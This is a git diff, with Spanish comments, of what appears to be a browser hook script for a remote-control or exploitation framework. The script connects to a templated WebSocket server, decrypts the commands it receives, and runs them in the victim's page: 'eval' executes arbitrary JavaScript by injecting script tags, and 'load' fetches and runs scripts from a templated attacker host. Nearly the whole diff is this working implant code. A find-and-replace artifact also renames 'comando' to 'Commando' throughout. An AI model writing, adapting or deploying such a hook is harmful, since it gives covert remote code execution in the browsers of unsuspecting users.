@@ -6,7 +6,7 @@ function sendMessage(msg) {
 function loadScriptFromURL(url) {
     // Si la URL no viene completa, se completa la URL para descargar el script del servidor
     if (!(/(http(s?)):\/\//i.test(url))) {
-        url = "http://$host:$hport/" + url
+        url = "http://$hhost:$hport/" + url
     }
     // Comprueba si el script existe, si existe devuelve true y carga una etiqueta script en el head del documento.
     return fetch(url).then(response => {
@@ -19,10 +19,6 @@ function loadScriptFromURL(url) {
     })
 }
 
-<<<<<<< HEAD
-const webSocket = new WebSocket("ws://$host:$wport");
-webSocket.onopen = (e) => {
-=======
 function loadScript(script) {
     var node = document.createElement("script");
     node.innerHTML = script;
@@ -30,36 +26,21 @@ function loadScript(script) {
     node.remove()
 }
 
-
-// Workaround para no utilizar eval
-var doExec = function () { };
-
-function execute(cmd) {
-
-    let node = document.createElement("script");
-    node.innerHTML = "doExec = function(){ return " + cmd + "}";
-    node.setAttribute('id', 'exec-')
-    document.getElementsByTagName("head")[0].appendChild(node);
-    node.remove()
-    return doExec();
-}
-
-const webSocket = new WebSocket("ws://" + host + ":" + wsport);
-webSocket.onopen = (event) => {
->>>>>>> e555594688ce80c742f1401e128f65a376deac94
+const webSocket = new WebSocket("ws://$whost:$wport");
+webSocket.onopen = (e) => {
     sendMessage({ type: 1 });
 };
 
-/* Esta es un diccionario de tipo {"string":function}, la string es el comando que recibirá el onmessage, la función será el comando.
+/* Esta es un diccionario de tipo {"string":function}, la string es el Commando que recibirá el onmessage, la función será el Commando.
 
-Para cargar más funcionalidades que interactúen con módulos en el backend se debe cargar en un script que incluya el comando al
+Para cargar más funcionalidades que interactúen con módulos en el backend se debe cargar en un script que incluya el Commando al
 diccionario. Importante mandar un mensaje en algún momento de la ejecución.
-Comandos por defecto:
+Commandos por defecto:
     OK - keep alive la conexión
-    eval - ejecuta lo que venga en el comando y devuelve lo que retorno
+    eval - ejecuta lo que venga en el Commando y devuelve lo que retorno
     load - carga un fichero desde un URL.
  */
-var _webs_comands_ = {
+var _webs_Commands_ = {
     "OK": function (mes) { sendMessage({ type: 1 }) },
     "eval": function (mes) {
         sendMessage({ type: 0, msg: { outputType: "console", text: execute(mes["expression"]) } })
@@ -79,7 +60,7 @@ webSocket.onmessage = (event) => {
     try {
         const output = hex2a(decrypt(event.data));
         let mes = JSON.parse(output)
-        _webs_comands_[mes["comand"]](mes)
+        _webs_Commands_[mes["Command"]](mes)
     } catch (e) { sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } }) }
 
 };
@@ -119,7 +100,6 @@ function hex2a(hexx) {
     for (var i = 0; i < hex.length; i += 2)
         str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
     return str;
-<<<<<<< HEAD
 }
 
 
@@ -134,6 +114,4 @@ function execute(cmd) {
     document.getElementsByTagName("head")[0].appendChild(node);
     node.remove()
     return doExec();
-=======
->>>>>>> e555594688ce80c742f1401e128f65a376deac94
 }
